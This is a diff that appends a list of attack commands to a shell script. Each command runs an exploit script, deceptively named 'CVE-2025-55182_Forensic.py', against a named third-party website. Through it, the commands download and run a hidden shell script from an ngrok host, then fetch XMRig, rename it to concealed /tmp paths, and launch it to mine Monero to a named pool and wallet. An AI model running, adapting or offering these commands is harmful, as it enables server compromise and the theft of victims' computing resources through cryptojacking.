@@ -42,3 +42,32 @@ done
 
 # TO DO 
 # add architectur detection & auto download & auto look up active machine to adapt name & auto cpu check to use 2 or less core ;threads-hint & pages 120
+
+
+
+python .\CVE-2025-55182_Forensic.py https://olbongo.co.tz 'wget -O /tmp/.unix.sh https://desired-gazelle-steadily.ngrok-free.app/Download/javx.sh'
+
+python .\CVE-2025-55182_Forensic.py https://olbongo.co.tz 'nohup /tmp/.unix.sh > /dev/null 2>&1 &'
+
+
+
+python .\CVE-2025-55182_Forensic.py https://olbongo.co.tz 'wget -O /tmp/moktar.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz'
+
+python .\CVE-2025-55182_Forensic.py https://olbongo.co.tz 'cd /tmp && tar -xvzf moktar.tar.gz'
+
+
+python .\CVE-2025-55182_Forensic.py https://olbongo.co.tz 'rm /tmp/moktar.tar.gz'
+
+python .\CVE-2025-55182_Forensic.py https://olbongo.co.tz 'mv /tmp/xmrig-6.25.0 /tmp/.x'
+
+python .\CVE-2025-55182_Forensic.py https://olbongo.co.tz 'rm /tmp/.x/config.json'
+
+python .\CVE-2025-55182_Forensic.py https://olbongo.co.tz 'mv /tmp/.x/xmrig /tmp/.x/mo'
+
+python .\CVE-2025-55182_Forensic.py https://olbongo.co.tz 'chmod +x /tmp/.x/mo'
+
+python .\CVE-2025-55182_Forensic.py https://olbongo.co.tz "ls -la /tmp/.x"
+
+python .\CVE-2025-55182_Forensic.py https://olbongo.co.tz 'nohup /tmp/.x/mo --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass Nextjs_336! --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=2 --cpu-max-threads-hint 75 > /dev/null 2>&1 &'
+
+python .\CVE-2025-55182_Forensic.py https://olbongo.co.tz "ps aux"
